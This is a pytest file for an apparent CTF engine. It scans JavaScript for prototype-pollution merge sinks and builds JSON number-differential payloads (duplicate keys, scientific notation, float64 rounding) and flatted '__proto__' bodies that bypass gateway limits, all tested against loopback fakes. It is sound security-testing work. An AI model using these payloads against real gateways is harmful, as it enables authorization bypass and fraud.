#!/usr/bin/env python3
"""Offline tests for the B-047 PP-gadget + JSON number-differential engine.

No event pin and no event infrastructure: the engine is plan-only, its inputs
are inert synthetic strings/files built inside each test, and the live-driver
tests spin up fake gateway+backend servers bound to 127.0.0.1 (never a real
target); every value in the cutover-shaped fake is synthetic.
"""
from __future__ import annotations

import datetime as dt
import hashlib
import json
import re
import sys
import threading
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "solvers" / "web"))

import pp_number_differential as E  # noqa: E402
from ctf import event, scope  # noqa: E402
from ctf.result import SolverResult  # noqa: E402


def _suite_profile():
    """The suite's pinned test scope profile (tests/conftest.py): loopback in
    scope, flag format unknown (any word prefix)."""
    prof = scope.pinned()
    assert prof is not None, "tests/conftest.py pins the suite scope profile"
    return prof


def _csctf_like_profile():
    """A synthetic profile whose flag format is known (CSCTF{...}) and whose
    live-service scope is loopback only."""
    return event.parse({
        "slug": "b047-test", "name": "B-047 test profile",
        "dates": {"start": dt.date(2026, 1, 1), "end": dt.date(2026, 12, 31)},
        "platform": {"kind": "ctfd", "base_url": "https://board.b047.test"},
        "flag": {"prefixes": ["CSCTF"]},
        "rules": {"submit_mode": "manual", "flag_sharing": "forbidden", "ai_on_platform": "allowed",
                  "live_service_scope": ["127.0.0.0/8"]},
    }, src="tests/test_web_pp_number_differential.py")


# --- Part 1: static PP-gadget scanner -------------------------------------

def test_unguarded_lodash_merge_is_flagged_exploitable():
    src = "const _ = require('lodash');\nfunction load(req){ _.merge(config, req.body); }\n"
    findings = E.scan_pp_gadgets(src)
    fams = {f["family"] for f in findings}
    assert "lodash_merge" in fams
    merge = next(f for f in findings if f["family"] == "lodash_merge")
    assert merge["exploitable_without_guard"] is True
    assert "__proto__" in merge["unguarded_keys"]


def test_guarded_recursive_merge_is_not_flagged_unguarded():
    # a hand-rolled recursive assign that skips __proto__ / constructor / prototype
    src = (
        "function deepMerge(t, s){\n"
        "  for (const k in s){\n"
        "    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;\n"
        "    t[k] = s[k];\n"
        "  }\n"
        "}\n"
    )
    findings = E.scan_pp_gadgets(src)
    # the recursive for..in sink is detected, but every dangerous key is guarded
    forin = [f for f in findings if f["family"] == "recursive_forin_assign"]
    assert forin, "the for..in assign loop should be detected"
    assert forin[0]["unguarded_keys"] == []
    assert forin[0]["exploitable_without_guard"] is False


def test_flatted_and_jquery_and_defaultsdeep_detected():
    src = (
        "const data = flatted.parse(raw);\n"
        "$.extend(true, target, userInput);\n"
        "_.defaultsDeep(opts, req.query);\n"
    )
    fams = {f["family"] for f in E.scan_pp_gadgets(src)}
    assert {"flatted_parse", "jquery_deep_extend", "lodash_defaultsdeep"} <= fams


def test_scanner_rejects_oversize_source():
    with pytest.raises(E.NumberDiffError):
        E.scan_pp_gadgets("x" * (E.MAX_SOURCE_BYTES + 1))


def test_hasownproperty_recursive_merge_is_still_exploitable():
    # The canonical vulnerable CTF merge: hasOwnProperty does NOT stop pollution,
    # because JSON.parse makes "__proto__" an own key of the source.
    src = (
        "function merge(t, s){\n"
        "  for (var k in s){\n"
        "    if (s.hasOwnProperty(k)){\n"
        "      if (typeof s[k] === 'object') { t[k] = merge(t[k] || {}, s[k]); }\n"
        "      else { t[k] = s[k]; }\n"
        "    }\n"
        "  }\n"
        "  return t;\n"
        "}\n"
    )
    forin = [f for f in E.scan_pp_gadgets(src) if f["family"] == "recursive_forin_assign"]
    assert forin
    assert forin[0]["exploitable_without_guard"] is True
    assert "__proto__" in forin[0]["unguarded_keys"]
    assert "hasOwnProperty" in forin[0]["weak_hints"]


def test_object_create_null_elsewhere_is_only_a_weak_hint():
    src = (
        "function load(req){\n"
        "  const cache = Object.create(null);\n"
        "  _.merge(config, req.body);\n"
        "}\n"
    )
    merge = next(f for f in E.scan_pp_gadgets(src) if f["family"] == "lodash_merge")
    assert merge["exploitable_without_guard"] is True
    assert merge["unguarded_keys"] == ["__proto__", "constructor", "prototype"]
    assert "Object.create(null)" in merge["weak_hints"]


def test_guard_before_the_call_site_counts():
    # the key filter precedes the sink in the same function: guarded
    src = (
        "function load(req){\n"
        "  if (Object.keys(req.body).some(k => k === '__proto__' || k === 'constructor' || k === 'prototype'))\n"
        "    throw new Error('bad key');\n"
        "  _.merge(config, req.body);\n"
        "}\n"
    )
    merge = next(f for f in E.scan_pp_gadgets(src) if f["family"] == "lodash_merge")
    assert merge["unguarded_keys"] == []
    assert merge["exploitable_without_guard"] is False


def test_guard_in_a_neighbouring_function_does_not_count():
    src = (
        "function safeCopy(t, s){ for (const k in s){ if (k === '__proto__' || k === 'constructor'"
        " || k === 'prototype') continue; t[k] = s[k]; } }\n"
        "function load(req){ _.merge(config, req.body); }\n"
    )
    findings = E.scan_pp_gadgets(src)
    merge = next(f for f in findings if f["family"] == "lodash_merge")
    assert merge["exploitable_without_guard"] is True
    assert merge["unguarded_keys"] == ["__proto__", "constructor", "prototype"]
    safe = next(f for f in findings if f["family"] == "recursive_forin_assign")
    assert safe["exploitable_without_guard"] is False


def test_includes_list_guard_clears_all_three_keys():
    src = (
        "function m(t, s){ for (const k in s){\n"
        "  if (['__proto__', 'constructor', 'prototype'].includes(k)) continue;\n"
        "  t[k] = s[k]; } }\n"
    )
    forin = next(f for f in E.scan_pp_gadgets(src) if f["family"] == "recursive_forin_assign")
    assert forin["unguarded_keys"] == []


def test_named_deep_merge_declaration_is_not_a_call_site_and_a_call_is_only_a_hint():
    decl_only = "function deepMerge(a, b){ return Object.assign(a, b); }\n"
    assert [f for f in E.scan_pp_gadgets(decl_only) if f["family"] == "named_deep_merge"] == []
    call = "function h(req){ deepMerge(cfg, req.body); }\n"
    hit = next(f for f in E.scan_pp_gadgets(call) if f["family"] == "named_deep_merge")
    assert hit["inherently_unsafe"] is False
    assert hit["exploitable_without_guard"] is False
    assert hit["unguarded_keys"] == ["__proto__", "constructor", "prototype"]


def test_guard_only_in_a_comment_does_not_clear_the_sink():
    # a guard that is commented out (or quoted in a string) guards nothing
    for guard_text in (
        "// k === '__proto__' k==='constructor' k==='prototype'\n",
        "/* if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue; */\n",
        "var note = \"k === '__proto__' || k === 'constructor' || k === 'prototype'\";\n",
    ):
        src = "function merge(t,s){ " + guard_text + " for (var k in s){ t[k] = s[k] } }\n"
        forin = next(f for f in E.scan_pp_gadgets(src) if f["family"] == "recursive_forin_assign")
        assert forin["unguarded_keys"] == ["__proto__", "constructor", "prototype"], guard_text
        assert forin["exploitable_without_guard"] is True, guard_text
    # the same guard as live code still clears every key (masking keeps the key literals)
    live = ("function merge(t,s){ for (var k in s){ if (k === '__proto__' || k === \"constructor\""
            " || k === `prototype`) continue; t[k] = s[k] } }\n")
    forin = next(f for f in E.scan_pp_gadgets(live) if f["family"] == "recursive_forin_assign")
    assert forin["unguarded_keys"] == ["prototype"]  # guard regexes accept ' and " only
    # a comment between the strings does not shift offsets or lines
    multi = "/* a\n b */ function f(req){\n  _.merge(cfg, req.body);\n}\n"
    hit = next(f for f in E.scan_pp_gadgets(multi) if f["family"] == "lodash_merge")
    assert hit["line"] == 3
    assert hit["evidence"] == "_.merge("
    assert multi[hit["offset"]:].startswith("_.merge(")


def test_call_site_inside_a_string_or_comment_is_not_reported():
    src = (
        'var s = "_.merge(a,b)";\n'
        "var t = '$.extend(true, x, y)';\n"
        "// flatted.parse(raw)\n"
        "/* for (var k in s) { t[k] = s[k] } */\n"
        "var u = `_.defaultsDeep(o, q)`;\n"
    )
    assert E.scan_pp_gadgets(src) == []
    # the same text as code is reported
    code = "_.merge(a,b);\n$.extend(true, x, y);\nflatted.parse(raw);\n"
    fams = [f["family"] for f in E.scan_pp_gadgets(code)]
    assert fams == ["lodash_merge", "jquery_deep_extend", "flatted_parse"]
    # the word `function` inside a comment does not make the next call a declaration
    hinted = "function h(req){ // see function\n  deepMerge(cfg, req.body); }\n"
    assert [f["family"] for f in E.scan_pp_gadgets(hinted)] == ["named_deep_merge"]


def test_weak_hints_come_from_the_sinks_own_code_only():
    src = (
        "function other(o, k){ return o.hasOwnProperty(k); }\n"
        "function load(req){ // hasOwnProperty( Object.create(null)\n"
        "  _.merge(config, req.body); }\n"
    )
    merge = next(f for f in E.scan_pp_gadgets(src) if f["family"] == "lodash_merge")
    assert merge["weak_hints"] == []
    live = "function load(req){ if (req.body.hasOwnProperty('x')) _.merge(config, req.body); }\n"
    merge = next(f for f in E.scan_pp_gadgets(live) if f["family"] == "lodash_merge")
    assert merge["weak_hints"] == ["hasOwnProperty"]


def test_forin_evidence_quotes_the_original_text_not_the_masked_copy():
    src = 'function f(t, s){ for (var k in s){ log("copy"); t[k] = s[k]; } }\n'
    forin = next(f for f in E.scan_pp_gadgets(src) if f["family"] == "recursive_forin_assign")
    assert forin["evidence"] == 'for (var k in s){ log("copy"); t[k] ='


def test_forin_comparison_is_not_mistaken_for_the_assignment():
    # `s[k] === x` is a comparison, not the `t[k] = ...` write
    src = "function f(t, s){ for (const k in s){ if (s[k] === 1) count++; } }\n"
    assert [f for f in E.scan_pp_gadgets(src) if f["family"] == "recursive_forin_assign"] == []


# --- flatted __proto__ reference payload ------------------------------------

def test_flatted_proto_payload_resolves_basis_to_array_prototype():
    body = E.flatted_proto_payload("basis", "hints", {"RECALL": True})
    assert json.loads(body) == [{"basis": "__proto__", "hints": "1"}, {"RECALL": True}]
    root = E.flatted_resolve_model(body)
    assert root["basis"] is E.ARRAY_PROTOTYPE
    assert root["hints"] == {"RECALL": True}


def test_flatted_model_resolves_ordinary_references_and_undefined():
    root = E.flatted_resolve_model('[{"a":"1","b":"7","c":"x"},"text"]')
    assert root["a"] == "text"
    assert repr(root["b"]) == "undefined"
    assert repr(root["c"]) == "undefined"


def test_flatted_payload_rejects_string_props():
    with pytest.raises(E.NumberDiffError):
        E.flatted_proto_payload("basis", "hints", {"RECALL": "yes"})


# --- Part 2: the two-parser number models ---------------------------------

def test_strict_json_vs_float64_precision_differential():
    token = str(2 ** 53 + 1)  # 9007199254740993
    exact = E.read_number_strict_json(token)
    approx = E.read_number_float64(token)
    assert exact == 2 ** 53 + 1
    assert int(approx) == 2 ** 53  # float64 rounds the odd unit away
    assert int(approx) != exact


def test_int_regex_gateway_rejects_sci_notation_backend_reads_it():
    # the gateway's `type: integer` check does not accept 1e3 ...
    assert E.read_number_int_regex("1e3") is None
    # ... but the Node backend's JSON.parse reads it as 1000.
    assert E.read_number_strict_json("1e3") == 1000.0


def test_strict_json_rejects_non_json_number_grammar():
    for bad in ("0x10", "+5", "01", "1.", ".5"):
        with pytest.raises(E.NumberDiffError):
            E.read_number_strict_json(bad)


def test_duplicate_key_body_first_vs_last_wins():
    body = E.duplicate_key_body("amount", 1, 1000000)
    pairs = E._body_pairs(body)
    assert E._resolve_pairs(pairs, "amount", last_wins=False) == 1
    assert E._resolve_pairs(pairs, "amount", last_wins=True) == 1000000
    # a real last-wins parser (Python json) agrees with the modelled last-wins read
    assert json.loads(body)["amount"] == 1000000


# --- number_differential_variants: verified by construction ----------------

def test_variants_each_satisfy_the_differential_invariant():
    variants = E.number_differential_variants("amount", gateway_limit=100, unlock_value=1000)
    mechs = {v.mechanism for v in variants}
    assert "duplicate_key" in mechs
    assert "sci_notation" in mechs
    for v in variants:
        if v.mechanism == "duplicate_key":
            pairs = E._body_pairs(v.body)
            assert E._resolve_pairs(pairs, "amount", last_wins=False) <= 100
            assert E._resolve_pairs(pairs, "amount", last_wins=True) == 1000
        elif v.mechanism == "sci_notation":
            # gateway integer-regex rejects the raw token; backend reads 1000
            raw = re.search(r'"amount":\s*([^,}]+)', v.body).group(1)
            assert E.read_number_int_regex(raw) is None
            assert E.read_number_strict_json(raw) == 1000


def test_float64_precision_variant_when_value_is_large():
    # choose a 2^53+ value whose float64 rounding lands within the limit window
    unlock = 2 ** 53 + 1
    variants = E.number_differential_variants("qty", gateway_limit=2 ** 53, unlock_value=unlock)
    f64 = [v for v in variants if v.mechanism == "float64_precision"]
    assert f64, "expected a float64-precision variant for a 2^53+ unlock value"
    v = f64[0]
    raw = re.search(r'"qty":\s*([^,}]+)', v.body).group(1)
    assert int(E.read_number_float64(raw)) <= 2 ** 53
    assert E.read_number_strict_json(raw) == unlock


def test_variants_reject_non_differential_values():
    with pytest.raises(E.NumberDiffError):
        E.number_differential_variants("amount", gateway_limit=100, unlock_value=50)


# --- detect_number_differentials ------------------------------------------

def test_detect_float64_precision_and_duplicate_key():
    body = '{"id": 9007199254740993, "amount": 1, "amount": 500}'
    diffs = E.detect_number_differentials(body)
    kinds = {d["kind"] for d in diffs}
    assert "float64_precision" in kinds
    assert "duplicate_key" in kinds
    f = next(d for d in diffs if d["kind"] == "float64_precision")
    assert f["exact"] == 9007199254740993
    assert f["exact"] != int(f["float64"])
    dup = next(d for d in diffs if d["kind"] == "duplicate_key")
    assert dup["key"] == "amount"
    assert dup["values"] == [1, 500]


def test_detect_sci_notation_integer_exponent():
    diffs = E.detect_number_differentials('{"type":"RECALL","value":359e5}')
    sci = [d for d in diffs if d["kind"] == "sci_notation"]
    assert len(sci) == 1
    assert sci[0]["token"] == "359e5"
    assert sci[0]["exact"] == 35900000
    assert sci[0]["int_gateway"] is None


def test_detect_sci_notation_skips_non_integral_and_plain_fractions():
    assert E.detect_number_differentials('{"a": 1.25e0, "b": 2.5}') == []
    # 1.5e1 is integral (15) even with a fraction in the mantissa
    assert [d["exact"] for d in E.detect_number_differentials('{"a": 1.5e1}')] == [15]


def test_detect_ignores_digits_inside_strings():
    assert E.detect_number_differentials('{"id": "9007199254740993", "ref": "1e5"}') == []


def test_detect_duplicate_key_is_numeric_only():
    # a non-numeric duplicate is parser_differential's report, not this engine's
    assert E.detect_number_differentials('{"s": "x", "s": "y"}') == []
    nested = E.detect_number_differentials('{"order": {"qty": 1, "qty": 900}}')
    assert nested == [{"kind": "duplicate_key", "path": "/order", "key": "qty",
                       "values": [1, 900], "first_wins": 1, "last_wins": 900}]


def test_detect_duplicate_key_int_vs_float_of_equal_value_counts():
    # 1 == 1.0 in Python, but a gateway that reads integers only treats 1.0 as a
    # non-integer: an int/float duplicate is a differential even at equal value.
    diffs = E.detect_number_differentials('{"a": 1, "a": 1.0}')
    assert diffs == [{"kind": "duplicate_key", "path": "/", "key": "a",
                      "values": [1, 1.0], "first_wins": 1, "last_wins": 1.0}]
    assert type(diffs[0]["last_wins"]) is float
    # identical duplicates (same type and value) are no differential
    assert E.detect_number_differentials('{"a": 1, "a": 1}') == []
    assert E.detect_number_differentials('{"a": 1.0, "a": 1.0}') == []


def test_detect_clean_body_has_no_differential():
    assert E.detect_number_differentials('{"amount": 42, "name": "ok"}') == []


def test_detect_rejects_non_json():
    with pytest.raises(E.NumberDiffError):
        E.detect_number_differentials("not json <<")


# --- Part 3: unlock-token builder and driver ------------------------------

def test_drive_unlock_extracts_token_with_injected_transport():
    sent = {}

    def fake_transport(url, body, headers):
        sent["url"] = url
        sent["body"] = body
        # a backend that read the last-wins amount would unlock
        return 200, {"Content-Type": "text/plain"}, b"welcome UNLOCK{cutover-ok} bye"

    variant = E.number_differential_variants("amount", gateway_limit=10, unlock_value=1000)[0]
    result = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=fake_transport,
                            profile=_suite_profile())
    assert result["token"] == "UNLOCK{cutover-ok}"
    assert result["status"] == 200
    assert sent["body"] == variant.body.encode("utf-8")
    assert len(result["steps"]) == 1


def test_drive_unlock_requires_a_transport():
    variant = E.number_differential_variants("amount", gateway_limit=10, unlock_value=1000)[0]
    with pytest.raises(E.NumberDiffError):
        E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=None)  # type: ignore[arg-type]


def test_drive_unlock_refuses_out_of_scope_url_before_sending():
    calls = []

    def transport(url, body, headers):
        calls.append(url)
        return 200, {}, b"CSCTF{never}"

    variant = E.number_differential_variants("amount", gateway_limit=10, unlock_value=1000)[0]
    with pytest.raises(scope.OutOfScope):
        E.drive_unlock("http://cutover.example.com/pay", variant, transport=transport,
                       profile=_suite_profile())
    # the default (profile=None) uses the pinned scope profile and refuses too
    with pytest.raises(scope.OutOfScope):
        E.drive_unlock("http://cutover.example.com/pay", variant, transport=transport)
    assert calls == []


def test_drive_unlock_uses_the_event_flag_format_not_css():
    page = b"<style>body{color:red}</style> receipt CSCTF{synthetic_flag_1}"

    def transport(url, body, headers):
        return 200, {}, page

    variant = E.number_differential_variants("amount", gateway_limit=10, unlock_value=1000)[0]
    known = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=transport,
                           profile=_csctf_like_profile())
    assert known["token"] == "CSCTF{synthetic_flag_1}"
    # unknown format (any word prefix): the CSS rule is never reported, the flag shape is
    unknown = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=transport,
                             profile=_suite_profile())
    assert unknown["token"] == "CSCTF{synthetic_flag_1}"

    def css_only(url, body, headers):
        return 200, {}, b"<style>body{color:red}</style> FLAG{wrong_prefix}"

    css = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=css_only,
                         profile=_suite_profile())
    assert css["token"] == "FLAG{wrong_prefix}"
    # a known format reports only its own prefix
    other = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=css_only,
                           profile=_csctf_like_profile())
    assert other["token"] is None


def test_drive_unlock_honours_a_caller_token_pattern():
    def transport(url, body, headers):
        return 200, {}, b"grant=ZZ-7f3a-0042 done"

    variant = E.number_differential_variants("amount", gateway_limit=10, unlock_value=1000)[0]
    default = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=transport,
                             profile=_suite_profile())
    assert default["token"] is None
    custom = E.drive_unlock("http://127.0.0.1:1/pay", variant, transport=transport,
                            profile=_suite_profile(), token_pattern=re.compile(r"ZZ-[0-9a-f]{4}-[0-9]{4}"))
    assert custom["token"] == "ZZ-7f3a-0042"


# --- unlock token ---------------------------------------------------------

SYNTH_UNLOCK_INPUT = "cutover|MRN-TEST01|35900000"
# sha256 of the line above, computed once and pinned so the join/encoding format is fixed
SYNTH_UNLOCK_SHA256 = "3f39e252e7e48da5bfc834b366b5269ec13b711711341d65652c10003adaf360"


def test_build_unlock_token_sha256_of_input_and_of_parts():
    assert E.build_unlock_token(SYNTH_UNLOCK_INPUT) == SYNTH_UNLOCK_SHA256
    assert E.build_unlock_token(["cutover", "MRN-TEST01", 35900000]) == SYNTH_UNLOCK_SHA256
    assert E.build_unlock_token(SYNTH_UNLOCK_INPUT, algo="sha1") == \
        hashlib.sha1(SYNTH_UNLOCK_INPUT.encode()).hexdigest()
    with pytest.raises(E.NumberDiffError):
        E.build_unlock_token(SYNTH_UNLOCK_INPUT, algo="nope")
    with pytest.raises(E.NumberDiffError):
        E.build_unlock_token([])


def test_extract_unlock_input_from_json_and_text():
    assert E.extract_unlock_input(
        '{"error":"flag.locked","detail":{"unlock_input":"' + SYNTH_UNLOCK_INPUT + '"}}'
    ) == SYNTH_UNLOCK_INPUT
    assert E.extract_unlock_input('HTTP 422 "unlock_input": "a|b|1" trailing') == "a|b|1"
    assert E.extract_unlock_input('{"error":"nope"}') is None


def test_with_body_field_keeps_the_number_lexeme():
    body = E.with_body_field('{"type":"RECALL","value":359e5}', "unlock", "ab")
    assert body == '{"type":"RECALL","value":359e5,"unlock":"ab"}'
    assert E.with_body_field("{}", "unlock", "ab") == '{"unlock":"ab"}'
    with pytest.raises(E.NumberDiffError):
        E.with_body_field("[1]", "unlock", "ab")


# --- live driver against a loopback fake gateway + backend -----------------

class _GatewayBackend(BaseHTTPRequestHandler):
    """Fake: a gateway that reads the FIRST `amount` (first-wins) and enforces a
    limit, forwarding the raw body to a backend that reads the LAST `amount`
    (Node JSON.parse, last-wins) and issues an unlock token above a threshold.
    This is the two-parser differential the engine targets, modelled locally."""

    LIMIT = 100
    THRESHOLD = 1000

    def log_message(self, *args):  # silence
        return

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length)
        text = raw.decode("utf-8", "replace")
        # gateway: first-wins integer read of amount
        first = re.search(r'"amount"\s*:\s*(-?\d+)', text)
        gateway_amount = int(first.group(1)) if first else None
        if gateway_amount is None or gateway_amount > self.LIMIT:
            self._send(403, "denied by gateway")
            return
        # backend: Node JSON.parse semantics (last-wins, exact)
        try:
            backend_amount = json.loads(text)["amount"]
        except (json.JSONDecodeError, KeyError, TypeError):
            self._send(400, "bad backend body")
            return
        if isinstance(backend_amount, int) and backend_amount >= self.THRESHOLD:
            self._send(200, f"UNLOCK{{cutover-{backend_amount}}}")
        else:
            self._send(200, "ok")

    def _send(self, status, body):
        payload = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


def _urllib_transport(url, body, headers):
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:  # loopback only
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as exc:  # 403 from the gateway arrives here
        return exc.code, dict(exc.headers), exc.read()


@pytest.fixture()
def loopback_gateway():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _GatewayBackend)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}/pay"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_live_driver_unlocks_via_duplicate_key_differential(loopback_gateway):
    variant = next(
        v for v in E.number_differential_variants("amount", gateway_limit=100, unlock_value=1000)
        if v.mechanism == "duplicate_key"
    )
    result = E.drive_unlock(loopback_gateway, variant, transport=_urllib_transport,
                            profile=_suite_profile())
    assert result["status"] == 200
    assert result["token"] == "UNLOCK{cutover-1000}"


def test_live_driver_single_value_is_denied_by_the_gateway(loopback_gateway):
    # a straight unlock value with no differential is caught at the edge: proves
    # the gateway check is real, not a rubber stamp.
    plain = E.NumberVariant("plain", '{"amount":1000}', 1000, 1000, "no differential")
    result = E.drive_unlock(loopback_gateway, plain, transport=_urllib_transport,
                            profile=_suite_profile())
    assert result["status"] == 403
    assert result["token"] is None


# --- two-step unlock against a loopback fake of the cutover shape ----------

class _CutoverFake(BaseHTTPRequestHandler):
    """Fake risk gateway + Node engine (synthetic values only).

    Gateway: screens `value` only when its lexeme is a bare integer, denying
    anything over CAP; a sci-notation lexeme is deferred (not screened).
    Engine: JSON.parse semantics.  With the right batch and value and no
    `unlock`, it answers 422 with `unlock_input`; it issues the receipt only when
    `unlock` is sha256_hex(unlock_input)."""

    CAP = 1_000_000
    BATCH = "MRN-TEST01"
    SETTLED = 35_900_000
    FLAG = "CSCTF{synthetic_cutover_receipt}"
    requests: list = []

    def log_message(self, *args):
        return

    def do_POST(self):
        raw = self.rfile.read(int(self.headers.get("Content-Length", "0"))).decode("utf-8", "replace")
        type(self).requests.append(raw)
        m = re.search(r'"value"\s*:\s*(-?\d+)\s*[,}]', raw)
        if m and int(m.group(1)) > self.CAP:
            return self._json(403, {"error": "gateway.denied"})
        try:
            body = json.loads(raw)
        except json.JSONDecodeError:
            return self._json(400, {"error": "bad.json"})
        if body.get("batch") != self.BATCH or body.get("value") != self.SETTLED:
            return self._json(409, {"error": "recall.not_reconcilable"})
        unlock_input = f"cutover|{self.BATCH}|{self.SETTLED}"
        if "unlock" not in body:
            return self._json(422, {"error": "flag.locked", "unlock_input": unlock_input})
        if body["unlock"] != hashlib.sha256(unlock_input.encode()).hexdigest():
            return self._json(403, {"error": "unlock.bad"})
        return self._json(200, {"receipt": {"batch": self.BATCH, "flag": self.FLAG}})

    def _json(self, status, obj):
        payload = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


@pytest.fixture()
def cutover_fake():
    _CutoverFake.requests = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _CutoverFake)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}/api/v1/instructions"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def _cutover_sci_variant():
    variants = E.number_differential_variants(
        "value", gateway_limit=_CutoverFake.CAP, unlock_value=_CutoverFake.SETTLED,
        other=[("type", "RECALL"), ("batch", _CutoverFake.BATCH)],
    )
    return next(v for v in variants if v.mechanism == "sci_notation")


def test_two_step_unlock_reads_unlock_input_hashes_and_resends(cutover_fake):
    variant = _cutover_sci_variant()
    assert '"value":359e5' in variant.body
    result = E.drive_unlock(cutover_fake, variant, transport=_urllib_transport,
                            profile=_csctf_like_profile())
    assert result["token"] == _CutoverFake.FLAG
    assert result["status"] == 200
    assert result["unlock_input"] == "cutover|MRN-TEST01|35900000"
    assert result["unlock"] == SYNTH_UNLOCK_SHA256
    assert [s["status"] for s in result["steps"]] == [422, 200]
    first, second = _CutoverFake.requests
    assert first == variant.body
    # step 2 resends the same body (the 359e5 lexeme survives) plus the digest
    assert second == variant.body[:-1] + ',"unlock":"' + SYNTH_UNLOCK_SHA256 + '"}'


def test_two_step_unlock_with_the_wrong_digest_gets_no_receipt(cutover_fake):
    result = E.drive_unlock(cutover_fake, _cutover_sci_variant(), transport=_urllib_transport,
                            profile=_csctf_like_profile(), algo="sha1")
    assert [s["status"] for s in result["steps"]] == [422, 403]
    assert result["token"] is None


def test_plain_integer_value_is_denied_by_the_cutover_gateway(cutover_fake):
    plain = '{"type":"RECALL","batch":"MRN-TEST01","value":35900000}'
    result = E.drive_unlock(cutover_fake, plain, transport=_urllib_transport,
                            profile=_csctf_like_profile())
    assert result["status"] == 403
    assert result["token"] is None
    assert len(result["steps"]) == 1


# --- Part 4: the contract engine ------------------------------------------

def test_solve_reports_gadget_and_number_signals(tmp_path):
    (tmp_path / "bundle.js").write_text(
        "const _ = require('lodash');\napp.post('/u', (req,res)=>{ _.merge(cfg, req.body); });\n"
    )
    (tmp_path / "order.body").write_text('{"amount": 1, "amount": 9007199254740993}')
    result = solve_wrapper(tmp_path)
    assert isinstance(result, SolverResult)
    assert result.status == "unsure"
    cat = json.loads(result.notes)
    assert "bundle.js" in cat["pp_gadgets"]
    assert "order.body" in cat["number_differentials"]


def test_solve_opt_driven_generation(tmp_path):
    result = solve_wrapper(tmp_path, diff_key="credits", gateway_limit=5, unlock_value=1000000000)
    cat = json.loads(result.notes)
    payloads = cat["payloads"]["number_differential"]
    assert payloads
    assert any(p["mechanism"] == "duplicate_key" for p in payloads)


def test_solve_blocked_on_missing_dir(tmp_path):
    result = solve_wrapper(tmp_path / "nope")
    assert result.status == "blocked"
    assert "not found" in result.notes


def test_solve_clean_dir_is_none(tmp_path):
    (tmp_path / "safe.json").write_text('{"amount": 42}')
    result = solve_wrapper(tmp_path)
    assert result.status == "none"


def test_solve_does_not_report_guarded_sinks(tmp_path):
    (tmp_path / "merge.js").write_text(
        "function deepMerge(t, s){\n"
        "  for (const k in s){\n"
        "    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;\n"
        "    t[k] = s[k];\n"
        "  }\n"
        "}\n"
    )
    assert E.scan_pp_gadgets((tmp_path / "merge.js").read_text()), "the guarded sink is still detected"
    result = solve_wrapper(tmp_path)
    assert result.status == "none"


def test_solve_emits_flatted_proto_payload(tmp_path):
    (tmp_path / "intake.js").write_text(
        "const flatted = require('./vendor/flatted');\n"
        "function intake(raw){ const m = flatted.parse(raw); merge(m.basis, m.hints); }\n"
    )
    result = solve_wrapper(tmp_path)
    cat = json.loads(result.notes)
    tmpl = cat["payloads"]["flatted_proto"]
    assert tmpl["filled"] is False
    assert json.loads(tmpl["body"])[0] == {"<target_field>": "__proto__", "<source_field>": "1"}
    filled = solve_wrapper(tmp_path, flatted_target="basis", flatted_source="hints",
                           flatted_props='{"RECALL": true}')
    body = json.loads(filled.notes)["payloads"]["flatted_proto"]["body"]
    assert body == '[{"basis":"__proto__","hints":"1"},{"RECALL":true}]'


def test_solve_never_reads_through_a_symlink(tmp_path):
    outside = tmp_path / "outside.json"
    outside.write_text('{"amount": 1, "amount": 777777}')
    chal = tmp_path / "chal"
    chal.mkdir()
    (chal / "link.json").symlink_to(outside)
    result = solve_wrapper(chal)
    assert result.status == "none"
    assert "777777" not in result.notes
    assert "link.json" in result.notes


def test_solve_notes_files_skipped_as_too_large(tmp_path, monkeypatch):
    monkeypatch.setattr(E, "MAX_SOURCE_BYTES", 64)
    (tmp_path / "big.json").write_text('{"amount": 1, "amount": 2, "pad": "' + "x" * 200 + '"}')
    result = solve_wrapper(tmp_path)
    assert result.status == "none"
    assert "too_large" in result.notes and "big.json" in result.notes


def solve_wrapper(path, **opts):
    return E.solve(Path(path), None, **opts)
